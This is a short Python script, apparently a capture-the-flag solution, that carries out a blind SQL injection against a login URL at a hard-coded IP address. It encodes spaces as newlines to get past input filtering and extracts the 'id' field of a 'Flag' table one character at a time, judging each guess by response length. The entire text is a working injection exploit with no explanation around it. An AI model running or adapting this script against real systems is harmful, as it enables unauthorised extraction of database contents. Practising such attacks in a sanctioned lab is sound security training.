import requests

req = requests.session()
 
flag = ''
for i in range(1, 50):
    p = ''
    for j in range(1, 255):
        # (select ascii(substr(id, "+str(i)+", 1)) from Flag where id < 2) < '
        payload = "(select%0Aascii(substr(id," + str(i) + ",1))%0Afrom%0AFlag%0Awhere%0Aid<2)<'" + str(j) + "'"
        #print payload
        url = "http://61.147.171.105:61333/zhuanxvlogin?user.name=admin'%0Aor%0A" + payload + "%0Aor%0Aname%0Alike%0A'admin&user.password=1"
        response = req.get(url)
        if len(response.text) > 20000 and p != '':
            flag += p
            print(i, flag)
            break
        p = chr(j)
